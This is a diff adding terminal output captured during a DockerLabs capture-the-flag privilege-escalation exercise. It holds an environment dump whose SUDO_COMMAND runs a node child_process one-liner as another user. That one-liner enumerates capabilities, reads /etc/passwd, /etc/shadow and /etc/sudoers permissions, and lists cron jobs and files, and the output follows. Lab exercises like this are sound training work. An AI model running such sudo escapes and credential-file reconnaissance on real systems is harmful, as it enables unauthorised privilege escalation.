@@ -1,0 +1,101 @@
+cat: /etc/sudoers: Permission denied
+BASH=/usr/bin/bash
+BASHOPTS=checkwinsize:cmdhist:complete_fullquote:extquote:force_fignore:globasciiranges:globskipdots:hostcomplete:interactive_comments:patsub_replacement:progcomp:promptvars:sourcepath
+BASH_ALIASES=()
+BASH_ARGC=([0]="0")
+BASH_ARGV=()
+BASH_CMDS=()
+BASH_EXECUTION_STRING=set
+BASH_LINENO=()
+BASH_LOADABLES_PATH=/usr/local/lib/bash:/usr/lib/bash:/opt/local/lib/bash:/usr/pkg/lib/bash:/opt/pkg/lib/bash:.
+BASH_SOURCE=()
+BASH_VERSINFO=([0]="5" [1]="2" [2]="21" [3]="1" [4]="release" [5]="x86_64-pc-linux-gnu")
+BASH_VERSION='5.2.21(1)-release'
+DIRSTACK=()
+EUID=1003
+GROUPS=()
+HOME=/home/calamardo
+HOSTNAME=dockerlabs
+HOSTTYPE=x86_64
+IFS=$' \t\n'
+LANG=C.UTF-8
+LOGNAME=calamardo
+MACHTYPE=x86_64-pc-linux-gnu
+MAIL=/var/mail/calamardo
+OPTERR=1
+OPTIND=1
+OSTYPE=linux-gnu
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+PIPESTATUS=([0]="0")
+PPID=217
+PS4='+ '
+PWD=/home/bob
+SHELL=/bin/bash
+SHELLOPTS=braceexpand:hashall:interactive-comments
+SHLVL=1
+SUDO_COMMAND='/bin/node -e const cp=require("child_process");const o=cp.execSync("bash -c set +e; echo @@@ getcap @@@; /sbin/getcap -r / 2>/dev/null; echo @@@ passwd perms @@@; ls -la /etc/passwd /etc/shadow; echo @@@ 12bn/ak.pk1 @@@; cat /bin/12bn; echo; cat /opt/ak.pk1; echo; echo @@@ root cron @@@; ls -la /etc/cron* 2>/dev/null; cat /etc/cron.d/* 2>/dev/null; echo @@@ opt @@@; ls -la /opt; echo @@@ usr/local/bin @@@; ls -la /usr/local/bin 2>/dev/null; echo @@@ sudoers full @@@; cat /etc/sudoers; echo @@@ ark/suid in /srv @@@; ls -la /srv/ransom; true").toString();console.log(o)'
+SUDO_GID=1002
+SUDO_UID=1002
+SUDO_USER=bob
+TERM=unknown
+UID=1003
+USER=calamardo
+_=']'
+@@@ getcap @@@
+@@@ passwd perms @@@
+-rw-r--r--. 1 root root   1341 Jan  5  2025 /etc/passwd
+-rw-r-----. 1 root shadow 1014 Jan  5  2025 /etc/shadow
+@@@ 12bn/ak.pk1 @@@
+ 
+
+ 
+
+@@@ root cron @@@
+/etc/cron.d:
+total 8
+drwxr-xr-x. 1 root root   6 Jan  5  2025 .
+drwxr-xr-x. 1 root root  56 Aug 14 21:49 ..
+-rw-r--r--. 1 root root 201 Apr  8  2024 e2scrub_all
+-rw-r--r--. 1 root root 712 Jan 18  2024 php
+
+/etc/cron.daily:
+total 12
+drwxr-xr-x. 1 root root   14 Jan  5  2025 .
+drwxr-xr-x. 1 root root   56 Aug 14 21:49 ..
+-rwxr-xr-x. 1 root root  539 Mar 18  2024 apache2
+-rwxr-xr-x. 1 root root 1478 Mar 22  2024 apt-compat
+-rwxr-xr-x. 1 root root  123 Feb  4  2024 dpkg
+30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
+10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
+# /etc/cron.d/php@PHP_VERSION@: crontab fragment for PHP
+#  This purges session files in session.save_path older than X,
+#  where X is defined in seconds as the largest value of
+#  session.gc_maxlifetime from all your SAPI php.ini files
+#  or 24 minutes if not defined.  The script triggers only
+#  when session.save_handler=files.
+#
+#  WARNING: The scripts tries hard to honour all relevant
+#  session PHP options, but if you do something unusual
+#  you have to disable this script and take care of your
+#  sessions yourself.
+
+# Look for and purge old sessions every 30 minutes
+09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi
+@@@ opt @@@
+total 4
+drwxr-xr-x. 1 root root 12 Jan  5  2025 .
+drwxr-xr-x. 1 root root 12 Aug 14 21:50 ..
+-rw-r--r--. 1 root root  2 Jan  5  2025 ak.pk1
+@@@ usr/local/bin @@@
+total 0
+drwxr-xr-x. 1 root root  0 Nov 19  2024 .
+drwxr-xr-x. 1 root root 16 Nov 19  2024 ..
+@@@ sudoers full @@@
+@@@ ark/suid in /srv @@@
+total 28
+drwxrwxr-x. 1 patricio patricio    34 Jan  5  2025 .
+drwxr-xr-x. 1 root     root        12 Jan  5  2025 ..
+-rw-rw-r--. 1 patricio patricio   379 Jan  5  2025 nota.txt
+-rw-rw-r--. 1 patricio patricio 17592 Jan  4  2025 pokemongo
+-rw-rw-r--. 1 patricio patricio    48 Jan  5  2025 private.txt
+
